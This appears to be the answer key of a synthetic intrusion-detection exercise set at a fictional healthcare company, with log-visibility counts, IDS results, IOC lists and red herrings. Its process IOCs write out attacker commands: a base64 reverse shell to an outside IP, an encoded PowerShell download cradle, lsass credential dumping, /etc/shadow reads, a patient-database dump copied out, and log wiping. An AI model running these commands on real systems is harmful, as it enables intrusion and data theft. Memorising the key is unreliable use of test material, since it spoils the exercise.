| evt-005 | ecar | delayed: 4 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
| evt-005 | zeek | delayed: 2, visible: 1 |
| evt-006 | asa | delayed: 31 |
| evt-006 | bash_history | visible: 6 |
| evt-006 | ecar | delayed: 54 |
| evt-006 | syslog | delayed: 8 |
| evt-006 | sysmon | delayed: 8 |
| evt-006 | windows_security | delayed: 5 |
| evt-006 | zeek | delayed: 19, visible: 12 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 3, filtered: 1 |
| evt-008 | ecar | delayed: 6, dropped: 1 |
| evt-008 | ids | delayed: 2 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 1, visible: 1 |
| evt-008 | zeek | delayed: 6 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 9 |
| evt-010 | sysmon | delayed: 9 |
| evt-010 | windows_security | delayed: 3 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 1 |
| evt-012 | asa | delayed: 3, filtered: 5 |
| evt-012 | ecar | delayed: 17 |
| evt-012 | sysmon | delayed: 6 |
| evt-012 | windows_security | delayed: 25 |
| evt-012 | zeek | delayed: 9 |
| evt-013 | asa | delayed: 4, filtered: 1 |
| evt-013 | ecar | delayed: 47 |
| evt-013 | sysmon | delayed: 43 |
| evt-013 | windows_security | delayed: 21 |
| evt-013 | zeek | delayed: 7, visible: 1 |
| evt-014 | ecar | delayed: 13 |
| evt-014 | sysmon | delayed: 13 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 2, visible: 1 |
| evt-015 | ecar | delayed: 23 |
| evt-015 | sysmon | delayed: 21 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 3, dropped: 1 |
| evt-016 | ecar | delayed: 34 |
| evt-016 | sysmon | delayed: 34 |
| evt-016 | windows_security | delayed: 10 |
| evt-017 | asa | delayed: 2 |
| evt-017 | ecar | delayed: 33 |
| evt-017 | sysmon | delayed: 32 |
| evt-017 | windows_security | delayed: 11 |
| evt-017 | zeek | delayed: 1, visible: 2 |
| evt-018 | asa | delayed: 28 |
| evt-018 | ecar | delayed: 36 |
| evt-018 | proxy | delayed: 10 |
| evt-018 | sysmon | delayed: 18 |
| evt-018 | windows_security | delayed: 19 |
| evt-018 | zeek | delayed: 62, visible: 8 |
| evt-019 | asa | delayed: 3, out_of_window: 1 |
| evt-019 | ecar | delayed: 3, out_of_window: 1 |
| evt-019 | proxy | delayed: 3, out_of_window: 1 |
| evt-019 | sysmon | delayed: 3, out_of_window: 1 |
| evt-019 | zeek | delayed: 6, out_of_window: 2 |
| evt-020 | asa | delayed: 21, filtered: 301 |
| evt-020 | ecar | delayed: 316, dropped: 6 |
| evt-020 | ids | delayed: 6, filtered: 280 |
| evt-020 | sysmon | delayed: 17 |
| evt-020 | windows_security | delayed: 334, visible: 2 |
| evt-020 | zeek | delayed: 502, filtered: 6, visible: 136 |
| evt-021 | asa | delayed: 89, dropped: 1, visible: 1 |
| evt-021 | ecar | delayed: 89, dropped: 2 |
| evt-021 | ids | delayed: 18, filtered: 164 |
| evt-021 | windows_security | delayed: 91 |
| evt-021 | zeek | delayed: 132, visible: 50 |
| evt-022 | asa | delayed: 2 |
| evt-022 | ecar | delayed: 27 |
| evt-022 | sysmon | delayed: 19, dropped: 7 |
| evt-022 | windows_security | delayed: 12 |
| evt-022 | zeek | delayed: 2 |
| evt-023 | asa | filtered: 5 |
| evt-023 | bash_history | visible: 12 |
| evt-023 | ecar | delayed: 40 |
| evt-023 | syslog | delayed: 8 |
| evt-023 | windows_security | delayed: 3 |
| evt-023 | zeek | delayed: 7, visible: 1 |
| evt-025 | asa | delayed: 4 |
| evt-025 | ecar | delayed: 32 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 27 |
| evt-025 | windows_security | delayed: 9 |
| evt-025 | zeek | delayed: 4, visible: 6 |
| evt-026 | asa | delayed: 8, filtered: 3 |
| evt-026 | ecar | delayed: 12 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | windows_security | delayed: 4 |
| evt-026 | zeek | delayed: 22, visible: 4 |
| evt-027 | ecar | delayed: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 2 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 3 |
| evt-030 | asa | delayed: 3 |
| evt-030 | ecar | delayed: 30 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 28 |
| evt-030 | windows_security | delayed: 8 |
| evt-030 | zeek | delayed: 3, dropped: 1, visible: 4 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 4, visible: 2 |
| evt-032 | ecar | delayed: 18 |
| evt-032 | sysmon | delayed: 18 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 13 |
| evt-033 | sysmon | delayed: 12 |
| evt-033 | windows_security | delayed: 13 |
| evt-034 | ecar | delayed: 2 |
| evt-034 | sysmon | delayed: 1 |
| evt-034 | windows_security | delayed: 2 |
| evt-035 | ecar | delayed: 1, dropped: 1 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | all | out_of_window: 1 |
| evt-email-001 | asa | delayed: 5, filtered: 2 |
| evt-email-001 | ecar | delayed: 13 |
| evt-email-001 | proxy | delayed: 2 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 7 |
| evt-email-001 | windows_security | delayed: 4 |
| evt-email-001 | zeek | delayed: 13, visible: 3 |
| evt-email-002 | asa | delayed: 2 |
| evt-email-002 | ecar | delayed: 14 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 13 |
| evt-email-002 | windows_security | delayed: 3 |
| evt-email-002 | zeek | visible: 4 |
| evt-email-003 | all | out_of_window: 28 |
| evt-email-003 | asa | delayed: 6, filtered: 4 |
| evt-email-003 | ecar | delayed: 12 |
| evt-email-003 | syslog | delayed: 12 |
| evt-email-003 | sysmon | delayed: 12 |
| evt-email-003 | windows_security | delayed: 16 |
| evt-email-003 | zeek | delayed: 20, visible: 6 |
| evt-email-004 | all | out_of_window: 8 |
| evt-email-004 | asa | delayed: 7, filtered: 2 |
| evt-email-004 | ecar | delayed: 15 |
| evt-email-004 | syslog | delayed: 17, dropped: 1 |
| evt-email-004 | sysmon | delayed: 5 |
| evt-email-004 | windows_security | delayed: 8 |
| evt-email-004 | zeek | delayed: 18, visible: 6 |
| evt-email-005 | asa | delayed: 4 |
| evt-email-005 | ecar | delayed: 4 |
| evt-email-005 | proxy | delayed: 1 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | windows_security | delayed: 1 |
| evt-email-005 | zeek | delayed: 6, visible: 6 |
| evt-email-006 | asa | delayed: 4 |
| evt-email-006 | ecar | delayed: 7 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 6 |
| evt-email-006 | windows_security | delayed: 5 |
| evt-email-006 | zeek | delayed: 9, visible: 2 |
| evt-email-007 | asa | delayed: 10, filtered: 1 |
| evt-email-007 | ecar | delayed: 14 |
| evt-email-007 | proxy | delayed: 1 |
| evt-email-007 | syslog | delayed: 9 |
| evt-email-007 | windows_security | delayed: 6 |
| evt-email-007 | zeek | delayed: 23, visible: 9 |
| evt-email-008 | asa | delayed: 10, filtered: 2 |
| evt-email-008 | ecar | delayed: 48 |
| evt-email-008 | proxy | delayed: 2 |
| evt-email-008 | syslog | delayed: 10, dropped: 1 |
| evt-email-008 | sysmon | delayed: 41 |
| evt-email-008 | windows_security | delayed: 14 |
| evt-email-008 | zeek | delayed: 26, visible: 2 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | delayed: 2 |
| evt-email-010 | asa | delayed: 1 |
| evt-email-010 | ecar | delayed: 1 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5 |
| evt-email-011 | asa | delayed: 6, filtered: 3 |
| evt-email-011 | ecar | delayed: 12 |
| evt-email-011 | proxy | delayed: 1 |
| evt-email-011 | syslog | delayed: 9 |
| evt-email-011 | sysmon | delayed: 7 |
| evt-email-011 | windows_security | delayed: 8 |
| evt-email-011 | zeek | delayed: 25 |
| f099d53e-5399-4f45-9c35-6ae088d562ed | ids | delayed: 1 |
| f2598b4f-0997-4797-a3c3-2143d481cb30 | ids | filtered: 1 |
| f420aec5-65c7-4ba1-83d4-9ca1df1162b1 | ids | delayed: 1 |
| f5fa8973-ce6a-43dc-85eb-f34eab0c5a64 | ids | delayed: 1 |
| f95cd246-02e4-4838-bd58-337130c20634 | ids | delayed: 2 |
| red_herring:rh-001 | ecar | delayed: 3 |
| red_herring:rh-001 | windows_security | delayed: 3 |
| red_herring:rh-002 | asa | delayed: 1 |
| red_herring:rh-002 | ecar | delayed: 39 |
| red_herring:rh-002 | sysmon | delayed: 38 |
| red_herring:rh-002 | windows_security | delayed: 12 |
| red_herring:rh-002 | zeek | delayed: 1 |
| red_herring:rh-003 | asa | delayed: 2 |
| red_herring:rh-003 | ecar | delayed: 5 |
| red_herring:rh-003 | ids | delayed: 1 |
| red_herring:rh-003 | proxy | delayed: 1 |
| red_herring:rh-003 | zeek | delayed: 4 |


## IDS Evaluation Summary

Observation totals: delayed=153, filtered=446, visible=4.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| snort-core | 1:2000357 | 3 | 3 | 0 | built_in=3 | `3edaebdfbb93` |
| snort-core | 1:2000560 | 4 | 4 | 0 | built_in=4 | `f90cf6b5ff02` |
| snort-core | 1:2000575 | 2 | 2 | 0 | built_in=2 | `4630d0d8d4fe` |
| snort-core | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `ad5aa6666da2` |
| snort-core | 1:2003068 | 2 | 2 | 0 | built_in=2 | `f0bb574b249b` |
| snort-core | 1:2016149 | 10 | 10 | 0 | built_in=10 | `bab1206f9b0d` |
| snort-core | 1:2024291 | 9 | 9 | 0 | built_in=9 | `150a92f262ce` |
| snort-core | 1:2027757 | 4 | 4 | 0 | built_in=4 | `fda84cc71913` |
| snort-core | 1:2027863 | 7 | 7 | 0 | built_in=7 | `4ffe82717d92` |
| snort-core | 1:2027865 | 97 | 15 | 82 | authored_attachment=9, built_in=6 | `ac19989456bb` |
| snort-core | 1:2029706 | 290 | 10 | 280 | authored_attachment=6, built_in=4 | `1774a120b308` |
| snort-core | 1:366 | 1 | 1 | 0 | built_in=1 | `de9e31eb5209` |
| snort-perimeter | 1:2000334 | 1 | 1 | 0 | built_in=1 | `8bc56022cdf4` |
| snort-perimeter | 1:2000428 | 2 | 2 | 0 | built_in=2 | `6c6e2606c05c` |
| snort-perimeter | 1:2000575 | 3 | 3 | 0 | built_in=3 | `7623837ce6e5` |
| snort-perimeter | 1:2002910 | 14 | 13 | 1 | built_in=13 | `53043ca71e2a` |
| snort-perimeter | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `eb424bed4d8d` |
| snort-perimeter | 1:2003068 | 2 | 2 | 0 | built_in=2 | `35ad02f359cf` |
| snort-perimeter | 1:2013028 | 4 | 4 | 0 | built_in=4 | `f0f0cc2a5ae6` |
| snort-perimeter | 1:2013504 | 4 | 4 | 0 | authored_attachment=1, built_in=3 | `499e42226068` |
| snort-perimeter | 1:2016149 | 3 | 3 | 0 | built_in=3 | `aa93347727bf` |
| snort-perimeter | 1:2016360 | 4 | 4 | 0 | built_in=4 | `9fabb50c61b3` |
| snort-perimeter | 1:2022476 | 1 | 1 | 0 | built_in=1 | `8e89218bacde` |
| snort-perimeter | 1:2023672 | 2 | 2 | 0 | built_in=2 | `3d9b0bc234c5` |
| snort-perimeter | 1:2023882 | 2 | 2 | 0 | built_in=2 | `5b13947b23c0` |
| snort-perimeter | 1:2024290 | 2 | 2 | 0 | built_in=2 | `7ff4d6d7130a` |
| snort-perimeter | 1:2024291 | 4 | 4 | 0 | built_in=4 | `5a7e0017240f` |
| snort-perimeter | 1:2024392 | 2 | 2 | 0 | built_in=2 | `02805cba4950` |
| snort-perimeter | 1:2024897 | 5 | 5 | 0 | built_in=5 | `e7d8b9a417d8` |
| snort-perimeter | 1:2025712 | 2 | 2 | 0 | built_in=2 | `a17801da27e1` |
| snort-perimeter | 1:2025991 | 3 | 3 | 0 | built_in=3 | `9f5e259603f2` |
| snort-perimeter | 1:2027757 | 2 | 2 | 0 | built_in=2 | `7221342535ee` |
| snort-perimeter | 1:2027863 | 4 | 4 | 0 | built_in=4 | `feb2ddd6a744` |
| snort-perimeter | 1:2027865 | 92 | 10 | 82 | authored_attachment=9, built_in=1 | `b2bfab998a9e` |
| snort-perimeter | 1:2028401 | 1 | 1 | 0 | built_in=1 | `2ab1b56c39d7` |
| snort-perimeter | 1:2029706 | 2 | 2 | 0 | built_in=2 | `d935a99983cb` |
| snort-perimeter | 1:366 | 3 | 3 | 0 | built_in=3 | `1cd3da823ef2` |
| snort-perimeter | 1:382 | 4 | 4 | 0 | built_in=4 | `840b5e2c760c` |
| snort-perimeter | 1:384 | 3 | 3 | 0 | built_in=3 | `33c99b8d7965` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.top (DGA Domain)
- 30rgw6r7503.top (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (C2 Server)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.top (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: C2OQnZr3NINKnZACwx
- SMTP Zeek UID: CBP8IOsAghK8TrG3yI
- SMTP Zeek UID: CBfzmrLgKBtLoA1gHF
- SMTP Zeek UID: CH6xgaZlICCplQnN78X
- SMTP Zeek UID: CI0Ptd32YYdqNze3pgY
- SMTP Zeek UID: CKUwnFtl2mKHCOhNdA
- SMTP Zeek UID: CcsC4rXsfAAPydR1cgj
- SMTP Zeek UID: Cdf42weRz0CSffR79c
- SMTP Zeek UID: CgBWMzaIcECTO8oniol
- SMTP Zeek UID: ChKielD8rL1DgZvLAC1
- SMTP Zeek UID: Cl2DHqlyRguRs66bU0
- SMTP Zeek UID: CnKyBTqRWRnApGqBsZc
- SMTP Zeek UID: CuJ5oM4Z30xxbIsjJb
- SMTP Zeek UID: CwkTZsC6s248VtT2fuf
- SMTP Zeek UID: CyPOQVhF8knt9pTnl
- Zeek UID: CCdoTsF6WH8WV7fkC
- Zeek UID: CQT0ZqFh6PowKFwBLA
- Zeek UID: CZUKGfLpi7WDDlc8K2K
- Zeek UID: CamMtCknBEmJm6mkZkn
- Zeek UID: Cn2EcgMO6PrOvSgVuH
- Zeek UID: CwPRZFmrIzWuhg4qDg
- Zeek UID: CxdA0SDagIagfjG4J
- Zeek UID: CxzU5RfCk8gWEebUq3D
- Zeek UID: Cy6zDvfyY3ZUtu6pru
- Zeek UID: CzRBxFAV01DmKt4Awm
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.top (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.cloud (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.top (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:05:16 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:18 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:19 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:05:27 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 14:04:45 UTC | lina.nguyen | WS-LNGUYEN-01 | Developer refreshes Ubuntu package metadata from the public archive | Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert. |
| 2024-03-18 17:09:44 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:45 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:56 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
